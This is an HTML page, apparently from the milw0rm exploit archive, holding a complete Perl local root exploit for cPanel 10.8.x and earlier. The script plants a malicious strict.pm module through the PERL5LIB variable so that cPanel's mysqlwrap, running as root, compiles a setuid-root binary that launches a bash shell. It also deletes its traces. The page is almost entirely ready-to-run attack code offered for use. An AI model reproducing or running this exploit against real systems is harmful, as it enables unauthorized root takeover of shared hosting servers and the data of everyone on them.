<html><head><title>cPanel <= 10.8.x (cpwrap via mysqladmin) Local Root Exploit</title></head><pre>#!/usr/bin/perl -w

# 10/01/06 - cPanel &lt;= 10.8.x cpwrap root exploit via mysqladmin
# use strict; # haha oh wait..

my $cpwrap       = &quot;/usr/local/cpanel/bin/cpwrap&quot;;
my $mysqlwrap    = &quot;/usr/local/cpanel/bin/mysqlwrap&quot;;
my $pwd          = `pwd`;

chomp $pwd;
$ENV{'PERL5LIB'} = &quot;$pwd&quot;;

if ( ! -x &quot;/usr/bin/gcc&quot; )  { die &quot;gcc: $!\n&quot;; }
if ( ! -x &quot;$cpwrap&quot; )       { die &quot;$cpwrap: $!\n&quot;; }
if ( ! -x &quot;$mysqlwrap&quot; )    { die &quot;$mysqlwrap: $!\n&quot;; }

open  (CPWRAP, &quot;&lt;$cpwrap&quot;) or die &quot;Could not open $cpwrap: $!\n&quot;;
while(&lt;CPWRAP&gt;) {
   if(/REMOTE_USER/) { die &quot;$cpwrap is patched.\n&quot;; }
}
close (CPWRAP);

open  (STRICT, &quot;&gt;strict.pm&quot;) or die &quot;Can't open strict.pm: $!\n&quot;;
print  STRICT  &quot;\$e  = \&quot;int main(){setreuid(0,0);setregid(0,0);system(\\\\\\\&quot;/bin/bash\\\\\\\&quot;);}\&quot;;\n&quot;;
print  STRICT  &quot;system(\&quot;/bin/echo -n \\\&quot;\$e\\\&quot;&gt;Maildir.c\&quot;);\n&quot;;
print  STRICT  &quot;system(\&quot;/usr/bin/gcc Maildir.c -o Maildir\&quot;);\n&quot;;
print  STRICT  &quot;system(\&quot;/bin/chmod 4755 Maildir\&quot;);\n&quot;;
print  STRICT  &quot;system(\&quot;/bin/rm -f Maildir.c strict.pm\&quot;);\n&quot;;
close (STRICT);

system(&quot;$mysqlwrap DUMPMYSQL 2&gt;/dev/null&quot;);

if ( -e &quot;Maildir&quot; ) {
   system(&quot;./Maildir&quot;);
}
else {
   unlink &quot;strict.pm&quot;;
   die &quot;Failed\n&quot;;
}

# milw0rm.com [2006-10-01]</pre></html>